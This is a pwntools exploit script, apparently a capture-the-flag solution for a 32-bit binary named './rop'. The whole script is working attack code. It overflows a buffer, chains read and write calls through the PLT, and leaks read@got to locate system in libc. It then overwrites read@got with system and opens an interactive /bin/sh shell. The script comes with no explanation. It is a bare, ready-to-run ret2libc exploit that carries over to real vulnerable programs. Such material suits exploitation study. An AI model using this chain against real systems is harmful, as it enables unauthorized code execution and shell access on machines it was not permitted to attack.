from pwn import *

p = process('./rop')
e = ELF('./rop')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
libc = ELF('/usr/lib32/libc.so.6')

binsh = '/bin/sh\x00'

read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
write_got = e.got['write']

p3ret = 0x0804901b # 0x0804901b : add esp, 8 ; pop ebx ; ret
writeable = e.bss() + 0x200

read_system = libc.sym['read'] - libc.sym['system']
print('read_to_system:', 0xd0c40)

pay = b'A'*0x3e # 62 bytes away from ret addr~~~~~~~~
# read(0, writeable, sizeof(binsh))
pay += p32(read_plt)
pay += p32(p3ret) + p32(0) + p32(writeable) + p32(len(str(binsh)))

# write(1, read@got, 4)
pay += p32(write_plt)
pay += p32(p3ret) + p32(1) + p32(read_got) + p32(4)

# read(0, read@got, 4) < overwriting
pay += p32(read_plt)
pay += p32(p3ret) + p32(0) + p32(read_got) + p32(4)

pay += p32(read_plt)
pay += p32(0xdeadbeef) + p32(writeable)

p.recvuntil(b'\n')

#gdb.attach(p, '''
#b *vuln+46
#c
#''')
pause()

p.sendline(pay)
pause()
p.send(binsh)
read = u32(p.recvn(4))
system = read - read_system
p.send(p32(system))


p.interactive()
